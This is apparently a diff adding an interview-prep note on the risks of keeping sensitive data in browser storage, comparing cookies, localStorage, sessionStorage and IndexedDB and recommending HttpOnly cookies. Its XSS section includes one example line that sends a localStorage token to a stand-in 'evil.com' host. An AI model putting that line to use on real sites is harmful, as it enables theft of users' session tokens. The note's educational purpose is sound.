@@ -1,0 +1,206 @@
+> Concept: Storing sensitive data on client storage
+
+Storing sensitive data on storage is not safe at all. Try to store it in server. Thats the first measure. But if now way, then store in client but with some remedies.
+
+---
+
+1. Overview & Core Concepts
+
+> What does “storing sensitive data on client storage” mean?
+
+It refers to persisting data in the user’s browser that could cause harm if exposed, modified, or stolen.
+
+Sensitive data includes:
+
+* Auth credentials (JWTs, session IDs, refresh tokens)
+* PII (email, phone, address) [Personally Identifiable Information]
+* Financial or health data
+* Internal feature flags or entitlements
+
+-
+
+> Why this matters in modern frontend apps:
+
+Modern SPAs and PWAs:
+
+* Rely heavily on client-side state
+* Run large amounts of logic in the browser
+* Are exposed to XSS, CSRF, and supply-chain attacks
+
+👉 In interviews, the key insight:
+
+> The browser is an untrusted environment. Anything stored there must be assumed readable and modifiable by the user or an attacker.
+
+Core browser storage mechanisms
+
+| Mechanism      | Accessible by JS | Sent to Server | Typical Use     |
+| -------------- | ---------------- | -------------- | --------------- |
+| Cookies        | ⚠️ Optional      | ✅ Yes          | Sessions        |
+| localStorage   | ✅ Yes            | ❌ No           | Preferences     |
+| sessionStorage | ✅ Yes            | ❌ No           | Temp UI state   |
+| IndexedDB      | ✅ Yes            | ❌ No           | Offline data    |
+| Cache API      | ⚠️ Indirect      | ❌ No           | Network caching |
+
+---
+
+2. Available Options & Trade-offs
+
+> Cookies
+
+Pros:
+* Automatically sent with HTTP requests
+* Can be protected with HttpOnly, Secure, SameSite
+* Best option for auth sessions
+
+Cons:
+* Size limit (~4KB)
+* Vulnerable if misconfigured
+* Third-party cookies increasingly restricted
+
+Use for:
+✔ Session identifiers
+❌ PII payloads
+
+---
+
+localStorage
+
+Pros:
+* Simple API
+* Persistent across sessions
+* Large (~5–10MB)
+
+Cons:
+* Fully accessible via JS
+* No expiration
+* Vulnerable to XSS
+
+Use for:
+✔ Non-sensitive preferences
+❌ Auth tokens, PII
+
+---
+
+> sessionStorage
+
+Pros:
+* Tab-scoped
+* Cleared on tab close
+
+Cons:
+* Still JS-accessible
+* No cross-tab sharing
+
+Use for:
+✔ Temporary UI state
+❌ Secrets
+
+---
+
+> IndexedDB
+
+Pros:
+* Large storage
+* Structured data
+* Async (non-blocking)
+
+Cons:
+* Complex API
+* Still vulnerable to XSS
+* Harder to inspect but not secure
+
+Use for:
+✔ Offline caches
+❌ Sensitive user data
+
+---
+
+3. Security Considerations & Risks
+
+Core principle
+
+> Client-side storage provides ZERO confidentiality guarantees.
+
+- Major vulnerabilities:
+* XSS → attacker reads localStorage, IndexedDB
+* Malicious extensions → read all storage
+* Shared devices → persistent data leakage
+* Replay attacks → stolen tokens reused
+
+- Why localStorage is dangerous for auth
+// ❌ Common but insecure
+localStorage.setItem("token", jwt);
+
+
+- If XSS occurs:
+fetch("https://evil.com/steal?token=" + localStorage.token);
+
+--
+
+Real-world consequences
+
+* Account takeovers
+* Silent long-lived breaches
+* Regulatory violations (GDPR fines)
+
+---
+
+4. Best Practices & Secure Design Patterns
+
+Golden rules (interview gold)
+
+1. Never store secrets client-side
+2. Prefer server-managed sessions
+3. Assume XSS will happen
+
+---
+
+5. Recommended auth pattern (FAANG standard)
+
+1. HttpOnly session cookies
+2. Short lived data
+3. Encryption
+
+--
+
+- HttpOnly session cookies
+Set-Cookie: session_id=abc123;
+  HttpOnly;
+  Secure;
+  SameSite=Lax;
+
+
+Why this works
+
+* JS cannot read it
+* Sent automatically
+* Mitigates token exfiltration
+
+---
+
+- If tokens must exist client-side
+
+*(e.g., mobile web, some BFF architectures)*
+
+Mitigations
+* Short-lived access tokens (using setTimeout)
+* Rotation via refresh tokens
+* In-memory storage only
+* Strong CSP headers
+
+
+
+
+---
+
+Encrypting client-side data
+
+⚠️ Encryption does NOT make storage secure
+Keys must live somewhere → attacker can extract them.
+
+Use encryption only for:
+
+* Casual data protection
+* Obfuscation against non-technical access
+
+-
